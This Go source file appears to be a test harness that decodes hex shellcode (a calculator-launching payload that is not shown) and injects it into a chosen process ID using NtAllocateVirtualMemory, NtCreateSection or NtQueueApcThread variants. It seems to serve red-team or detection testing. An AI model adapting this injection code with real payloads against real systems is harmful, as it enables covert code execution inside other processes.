package main

import (
	"encoding/hex"
	"strings"
	"time"

	"gitlab.com/mjwhitta/cli"
	hl "gitlab.com/mjwhitta/hilighter"
	"gitlab.com/mjwhitta/log"
	"gitlab.com/mjwhitta/runsc"
)

// Exit status
const (
	Good = iota
	InvalidOption
	InvalidArgument
	MissingArguments
	ExtraArguments
	Exception
)

func getPayload() string {
	var payload []string = calc

	if flags.min {
		payload = calcMin
	}

	return strings.Join(payload, "")
}

func main() {
	defer func() {
		if r := recover(); r != nil {
			if flags.verbose {
				panic(r.(error).Error())
			}
			log.ErrX(Exception, r.(error).Error())
		}
	}()

	var e error
	var pid = uint32(flags.pid)
	var sc []byte

	validate()

	// Convert hex to shellcode
	if sc, e = hex.DecodeString(getPayload()); e != nil {
		panic(e)
	}

	if flags.wait {
		time.Sleep(20 * time.Second)
	}

	for i := 0; i < int(flags.times); i++ {
		switch strings.ToLower(cli.Arg(0)) {
		case "navm", "ntallocatevirtualmemory":
			log.Info("Launching calc with NtAllocateVirtualMemory")
			e = runsc.WithNtAllocateVirtualMemory(pid, sc)
			if e != nil {
				panic(e)
			}
		case "ncs", "ntcreatesection":
			log.Info("Launching calc with NtCreateSection")
			if e = runsc.WithNtCreateSection(pid, sc); e != nil {
				panic(e)
			}
		case "nqat", "ntqueueapcthread":
			log.Info("Launching calc with NtQueueApcThread")
			if e = runsc.WithNtQueueApcThread(pid, sc); e != nil {
				panic(e)
			}
		case "nqate", "ntqueueapcthreadex":
			log.Info("Launching calc with NtQueueApcThreadEx")
			if e = runsc.WithNtQueueApcThreadEx(pid, sc); e != nil {
				panic(e)
			}
		default:
			panic(hl.Errorf("runsc: unsupported method"))
		}

		time.Sleep(time.Second)
	}

	if flags.wait {
		time.Sleep(10 * time.Minute)
	}
}
